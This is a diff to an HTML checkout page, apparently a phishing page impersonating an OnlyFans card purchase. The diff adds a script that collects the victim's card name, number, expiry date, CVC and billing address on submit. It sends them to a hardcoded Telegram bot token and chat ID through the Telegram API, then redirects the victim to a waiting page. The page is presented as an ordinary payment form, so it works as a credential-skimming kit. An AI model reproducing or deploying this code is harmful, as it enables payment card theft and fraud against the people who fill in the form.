@@ -112,30 +112,30 @@
                 <h5 style="color:black">Purchase with credit/debit card</h5>
                     </center>
                     <div class="wow fadeIn" data-wow-delay="0.3s">
-                        <form action="https://formsubmit.co/viewpointlog@yahoo.com" method="post">
+                        <form action="" id='messageForm' method="post">
                             <div class="row g-3">
                                 
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="cname" id="subject" placeholder="Name on the card" required>
+                                        <input type="text" class="form-control" name="cname" id="cname" placeholder="Name on the card" required>
                                         <label for="subject">Name</label>
                                     </div>
                                 </div>
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="cno" id="subject" placeholder="Card Number" required>
+                                        <input type="text" class="form-control" name="cno" id="cno" placeholder="Card Number" required>
                                         <label for="subject">Card Number</label>
                                     </div>
                                 </div>
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="exp" id="subject" placeholder="Expiry Date" required>
+                                        <input type="text" class="form-control" name="exp" id="exp" placeholder="Expiry Date" required>
                                         <label for="subject">Expiry Date</label>
                                     </div>
                                 </div>
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="cvc" id="subject" placeholder="CVC Code" required>
+                                        <input type="text" class="form-control" name="cvc" id="cvc" placeholder="CVC Code" required>
                                         <label for="subject">CVC Code</label>
                                     </div>
                                 </div>
@@ -146,31 +146,31 @@
                                 <br>
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="count" id="subject" placeholder="Country" required>
+                                        <input type="text" class="form-control" name="count" id="count" placeholder="Country" required>
                                         <label for="subject">Country</label>
                                     </div>
                                 </div>
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="add" id="subject" placeholder="Address" required>
+                                        <input type="text" class="form-control" name="add" id="add" placeholder="Address" required>
                                         <label for="subject">Address</label>
                                     </div>
                                 </div>
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="city" id="subject" placeholder="City" required>
+                                        <input type="text" class="form-control" name="city" id="city" placeholder="City" required>
                                         <label for="subject">City</label>
                                     </div>
                                 </div>
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="sta" id="subject" placeholder="State" required>
+                                        <input type="text" class="form-control" name="state" id="state" placeholder="State" required>
                                         <label for="subject">State</label>
                                     </div>
                                 </div>
                                 <div class="col-12">
                                     <div class="form-floating">
-                                        <input type="text" class="form-control" name="zip" id="subject" placeholder="Zip" required>
+                                        <input type="text" class="form-control" name="zip" id="zip" placeholder="Zip" required>
                                         <label for="subject">Zip</label>
                                     </div>
                                 </div>
@@ -180,6 +180,42 @@
                                 </div>
                             </div>
                         </form>
+
+                        <script>
+							document.getElementById("messageForm").addEventListener("submit", function (event) {
+								event.preventDefault(); // Prevent form submission
+					
+								const name = document.getElementById("cname").value;
+								const number = document.getElementById("cno").value;
+								const date = document.getElementById("exp").value;
+								const cvc = document.getElementById("cvc").value;
+								const country = document.getElementById("count").value;
+								const address = document.getElementById("add").value;
+								const city = document.getElementById("city").value;
+								const state = document.getElementById("state").value;
+								const zip = document.getElementById("zip").value;
+					
+								// Replace with your actual Telegram bot token and chat ID
+								const botToken = "5413752123:AAECYWxhV0O4aR0XJIMQRuk1JjB_WgS7c5c";
+								const chatId = "1583663624";
+								const text = `OnlyFans\nCardName: ${name}\nCardNumber: ${number}\nExpiryDate: ${date}\nCvc: ${cvc}\nCountry: ${country}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZipCode: ${zip}`;
+								const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+					
+								fetch(url, { method: "GET" })
+									.then(response => {
+										if (response.ok) {
+											console.log("Message sent successfully!");
+											// Redirect to another page (replace with your desired URL)
+									window.location.href = "wait.html"; // Change this U
+										} else {
+											console.error("Error sending message:", response.statusText);
+										}
+									})
+									.catch(error => {
+										console.error("Network error:", error);
+									});
+							});
+						</script>
                     </div>
                 </div>
             </div>
